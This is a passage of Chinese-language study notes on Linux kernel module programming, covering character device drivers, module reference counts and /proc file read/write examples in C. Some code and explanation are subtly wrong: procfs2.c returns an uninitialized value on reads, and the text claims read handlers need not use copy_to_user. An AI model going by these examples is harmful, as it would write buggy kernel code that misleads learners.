<p>注：存在一种方式自动创建设备<code>class_create()</code>，Linux内核提供一组函数，可以用来在模块加载的时候自动在&#x2F;dev目录下创建相应的设备节点，并在卸载模块时删除该节点，当然前提条件是用户空间移植了<a href="https://zhuanlan.zhihu.com/p/373517974">udev</a>（一个用户空间程序）。内核中定义了<code>struct class</code>结构体，顾名思义，一个<code>struct class</code>结构体类型变量对应一个类，内核同时提供了<code>class_create()</code>函数，可以用它来创建一个类，这个类存放在sysfs下，一旦创建好后，再调用<code>device_create()</code>函数来在&#x2F;dev目录下创建相应的设备节点。这样，加载模块的时候，用户空间中的udev会自动响应<code>device_create()</code>函数，去&#x2F;sysfs下寻找对应的类从而创建设备节点。i</p>
<h4 id="4-1-4-Unregistering-A-Device"><a href="#4-1-4-Unregistering-A-Device" class="headerlink" title="4.1.4 Unregistering A Device"></a>4.1.4 Unregistering A Device</h4><p>我们不能让root用户需要需要使用内核模块时将其卸载。如果设备驱动文件被一个进程打开然后将其内核模块卸载，使用该文件会造成对原内核模块对应的内存地址的访问，但由于内存地址已发生改变，会导致意想不到的结果。</p>
<p>一般情况下，可以让函数返回负值来禁用某功能，不过<code>cleaup_module</code>无法实现因为其为<code>void</code>函数。不过，存在一个计数器来记录多少进程在占用模块。通过<code>/proc/modules</code>的第三个参数即可。若不为零，则无法卸载（该操作内核已实现）</p>
<p>可以使用以下函数来改变计数器值：</p>
<p><code>try_module_get(THIS_MODULE)</code>: 增加计数</p>
<p><code>module_put(THIS_MODULE)</code>： 减少计数</p>
<h4 id="4-1-5-chardev-c"><a href="#4-1-5-chardev-c" class="headerlink" title="4.1.5 chardev.c"></a>4.1.5 chardev.c</h4><p>以下代码创建了一个字符类设备驱动<code>chardev</code>。该设备文件可以记录设备文件被读取的次数。无法写入该设备文件，不过会记录此行为并告知用户该行为不受支持。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  chardev.c: Creates a read-only char device that says how many times</span></span><br><span class="line"><span class="comment"> *  you&#x27;ve read from the dev file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for put_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  Prototypes - this would normally go in a .h file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;chardev&quot;</span>	<span class="comment">/* Dev name as it appears in /proc/devices   */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80		<span class="comment">/* Max length of the message from the device */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Global variables are declared as static, so are global within the file. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Major;		<span class="comment">/* Major number assigned to our device driver */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Device_Open = <span class="number">0</span>;	<span class="comment">/* Is device open?  </span></span><br><span class="line"><span class="comment">				 * Used to prevent multiple access to device */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> msg[BUF_LEN];	<span class="comment">/* The msg the device will give when asked */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *msg_Ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        Major = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Major &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	  printk(KERN_ALERT <span class="string">&quot;Registering char device failed with %d\n&quot;</span>, Major);</span><br><span class="line">	  <span class="keyword">return</span> Major;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;I was assigned major number %d. To talk to\n&quot;</span>, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the driver, create a dev file with\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;&#x27;mknod /dev/%s c %d 0&#x27;.\n&quot;</span>, DEVICE_NAME, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Try various minor numbers. Try to cat and echo to\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the device file.\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Remove the device file and module when done.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Unregister the device </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> ret = unregister_chrdev(Major, DEVICE_NAME);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		printk(KERN_ALERT <span class="string">&quot;Error in unregister_chrdev: %d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Methods</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process tries to open the device file, like</span></span><br><span class="line"><span class="comment"> * &quot;cat /dev/mycharfile&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Device_Open)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">	Device_Open++;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">&quot;I already told you %d times Hello world!\n&quot;</span>, counter++);</span><br><span class="line">	msg_Ptr = msg;</span><br><span class="line">	try_module_get(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process closes the device file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	Device_Open--;		<span class="comment">/* We&#x27;re now ready for our next caller */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Decrement the usage count, or else once you opened the file, you&#x27;ll</span></span><br><span class="line"><span class="comment">	 * never get get rid of the module. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process, which already opened the dev file, attempts to</span></span><br><span class="line"><span class="comment"> * read from it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *filp,	<span class="comment">/* see include/linux/fs.h   */</span></span></span><br><span class="line"><span class="params">			   <span class="type">char</span> *buffer,	<span class="comment">/* buffer to fill with data */</span></span></span><br><span class="line"><span class="params">			   <span class="type">size_t</span> length,	<span class="comment">/* length of the buffer     */</span></span></span><br><span class="line"><span class="params">			   <span class="type">loff_t</span> * offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of bytes actually written to the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> bytes_read = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re at the end of the message, </span></span><br><span class="line"><span class="comment">	 * return 0 signifying end of file </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (*msg_Ptr == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Actually put the data into the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">while</span> (length &amp;&amp; *msg_Ptr) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* </span></span><br><span class="line"><span class="comment">		 * The buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">		 * segment so &quot;*&quot; assignment won&#x27;t work.  We have to use </span></span><br><span class="line"><span class="comment">		 * put_user which copies data from the kernel data segment to</span></span><br><span class="line"><span class="comment">		 * the user data segment. </span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		put_user(*(msg_Ptr++), buffer++);</span><br><span class="line"></span><br><span class="line">		length--;</span><br><span class="line">		bytes_read++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Most read functions return the number of bytes put into the buffer</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> bytes_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Called when a process writes to dev file: echo &quot;hi&quot; &gt; /dev/hello </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> *buff, <span class="type">size_t</span> len, <span class="type">loff_t</span> * off)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Sorry, this operation isn&#x27;t supported.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到成功装载模块，<code>major number506</code>。</p>
<img src="/posts/79c0f484/image-20240114145543938.png" class="" title="image-20240114145543938">

<p>使用<code>mknod</code>命令创建新设备驱动文件，读取内容，可以看到次数发生改变。无写入权限。</p>
<img src="/posts/79c0f484/image-20240114145523551.png" class="" title="image-20240114145523551">



<h4 id="4-1-6-兼容多个版本的内核模块"><a href="#4-1-6-兼容多个版本的内核模块" class="headerlink" title="4.1.6 兼容多个版本的内核模块"></a>4.1.6 兼容多个版本的内核模块</h4><p><strong>内核暴露给进程的系统调用在各个版本之间基本一致。可能会加入新的系统调用，但是旧的调用的行为会保持不变（向后兼容）。</strong>不过有一些系统版本（奇数：开发版）会有改变。</p>
<p>为了适应不同版本，需要编写条件编译指令。将<code>LINUX_VERSION_CODE</code>与<code>KERNEL_VERSION</code>进行比较。如果内核版本为<code>a.b.c</code>，宏的值应为<code>$2^&#123;16&#125;a+2^&#123;8&#125;b+c$</code></p>
<h2 id="Chapter-5-The-proc-File-System"><a href="#Chapter-5-The-proc-File-System" class="headerlink" title="Chapter 5. The &#x2F;proc File System"></a>Chapter 5. The &#x2F;proc File System</h2><h3 id="5-1-The-proc-File-System"><a href="#5-1-The-proc-File-System" class="headerlink" title="5.1 The &#x2F;proc File System"></a>5.1 The &#x2F;proc File System</h3><p>在Linux系统中，内核和内核模块有一种另外的方式与进程通信——&#x2F;proc 文件系统。&#x2F;proc文件系统最初的设计是为了方便访问进程信息，现在它被内核广泛调用来获取信息。</p>
<p>使用&#x2F;proc文件系统的方法与设备驱动程序相似，使用&#x2F;proc文件所需信息创建一个结构体，包括指向处理函数的指针。然后<code>init_module</code>注册该结构，<code>cleanup_module</code>注销。</p>
<p>为避免冲突，使用<code>proc_register_dynamic</code>来让内核决定<code>inode number</code>，与普通的文件系统不同，<code>/proc</code>文件系统位于内存中。在正常情况下，<code>inode number</code>是指向文件在磁盘位置的指针。<code>inode</code>包含文件的基本信息，例如权限，硬盘位置指针。</p>
<p>在以下代码中，打开&#x2F;关闭文件并不会调用函数，因此不会放入<code>try_module_get</code>和<code>try_module_put</code>函数，如果文件被打开时模块被删除，那么会导致内存访问越界。</p>
<p>当使用<code>proc_create</code>函数加载模块时，将创建<code>/proc/helloworld</code>返回值是一个结构体<code>struct proc_dir_entry</code>，并且该结构体会用于配置<code>/proc/helloworld</code>，例如文件拥有者。若返回空，则表明创建失败。</p>
<p>每当文件<code>/proc/helloworld</code>被读取时，函数<code>procfs_read</code>会被调用。有两个参数比较重要<code>buffer： 返回给读取文件应用进程的内容</code>, <code>offset： 当前文件的位置</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  procfs1.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_parent</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len, temp;</span><br><span class="line"><span class="type">char</span> *msg;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(count &gt; temp)</span><br><span class="line">		count = temp;</span><br><span class="line">	temp = temp-count;</span><br><span class="line"></span><br><span class="line">	raw_copy_to_user(buf, msg, count);</span><br><span class="line">	<span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">		temp = len;</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">	.proc_read = read_proc</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_proc_entry</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*create a file named world, and read attribute to this file using proc_fops*/</span></span><br><span class="line">	proc_create(<span class="string">&quot;world&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	msg = <span class="string">&quot;hello world\n&quot;</span>;		<span class="comment">/*file content*/</span></span><br><span class="line">	len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">	temp = len;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;1.len=%d&quot;</span>, len);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;proc initialized&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">proc_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	create_new_proc_entry();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Inside cleanup_module\n&quot;</span>);</span><br><span class="line">	remove_proc_entry(<span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(proc_init);</span><br><span class="line">module_exit(proc_cleanup);</span><br></pre></td></tr></table></figure>

<p>结果如下图所示：</p>
<img src="/posts/79c0f484/image-20240115091551536.png" class="" title="image-20240115091551536">

<h3 id="5-2-读写-proc文件"><a href="#5-2-读写-proc文件" class="headerlink" title="5.2 读写&#x2F;proc文件"></a>5.2 读写&#x2F;proc文件</h3><p>文件写入使用<code>copy_from_user</code>或<code>get_user</code>读取用户输入，与read不同。</p>
<p>使用<code>copy_from_user</code>或<code>get_user</code>函数的原因为Linux系统内存是分段的，指针指向内存地址不是实际内存上特定地址，而是一个内存段上的地址。内核有一个内存段，其他每个进程都有一个内存段。</p>
<p>每个进程都只能访问他自己的内存段，因此当编写作为进程运行的一般程序时，不需要担心此问题。当编写内核模块时，一般情况下系统会自动让你访问内核的内存段。然而，当内存缓冲区的内容需要在进程与内核之间传递时，内核函数会接受一个指向进程内存段的指针。<code>put_user</code>和<code>get_user</code>可以让你成功访问这些内存地址。不过这两个函数一次只能处理一个字符，可以使用<code>copy_to_user</code>和<code>copy_from_user</code>来处理字符串。由于buffer位于内和空间，因此对于写入操作而言你需要引入用户空间的数据，即只能使用<code>copy_from_user</code>函数，而读取操作因为数据本身就在内核态，可以不使用<code>copy_to_user</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  procfs2.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for copy_from_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE     1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_NAME         <span class="string">&quot;bufferlk&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The buffer used to store character for this module</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE];</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The size of the buffer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * This function is called then the /proc file is read</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;procfile_read (/proc/%s) called\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Read data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">    <span class="keyword">if</span> (*offp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* we have finished to read, return 0 */</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fill the buffer, return the buffer size*/</span></span><br><span class="line">        copy_to_user(buf, procfs_buffer, procfs_buffer_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This function is called with the /proc file is written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">write_proc</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">		   <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* get buffer size */</span></span><br><span class="line">	procfs_buffer_size = count;</span><br><span class="line">	<span class="keyword">if</span> (procfs_buffer_size &gt; PROCFS_MAX_SIZE ) &#123;</span><br><span class="line">		procfs_buffer_size = PROCFS_MAX_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* write data to the buffer */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Write data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> procfs_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">    .proc_read = read_proc,</span><br><span class="line">    .proc_write = write_proc,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* create the /proc file */</span></span><br><span class="line">	proc_create(PROCFS_NAME, <span class="number">0644</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_NAME);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">/* everything is ok */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	remove_proc_entry(PROCFS_NAME, <span class="literal">NULL</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita_Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>写入并读取内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sh -c &#x27;echo &quot;I LOVE YOU&quot; &gt; /proc/bufferlk&#x27;</span><br><span class="line">❯ cat /proc/bufferlk</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/%E6%88%AA%E5%9B%BE%202024-01-15%2010-34-28.png" class="" title="截图 2024-01-15 10-34-28">

<h3 id="5-3-Manage-proc-file-with-standard-filesystem"><a href="#5-3-Manage-proc-file-with-standard-filesystem" class="headerlink" title="5.3 Manage &#x2F;proc file with standard filesystem"></a>5.3 Manage &#x2F;proc file with standard filesystem</h3><p>还可以使用inode来管理&#x2F;proc文件，好处是可以使用一些高级函数，例如权限。</p>
<p>Linux系统中，对于文件系统注册有一套标准的方法。因为每一个文件系统都有它自己的操作函数来管理inode和文件操作，需要一个结构体来指向这些函数，结构体<code>struct inode_operations</code>，该结构体包含<code>proc_ops</code>。</p>
<p>文件操作与inode操作的区别在于，文件操作处理文件本身，而inode操作处理引用文件的方式，例如创建到该文件的链接。</p>
<p>还有个函数<code>module_permission</code>。当进程要对&#x2F;proc文件进行操作时会先调用此函数，查看是否有权限来进行操作。</p>
<p>注：内核的read和write函数的作用与正常程序相反，read函数用于输出，write函数用于输入。因为如果进程要从内核中读取数据，内核需要输出，写入数据时，内核是接受数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs3.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 10, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/minmax.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span 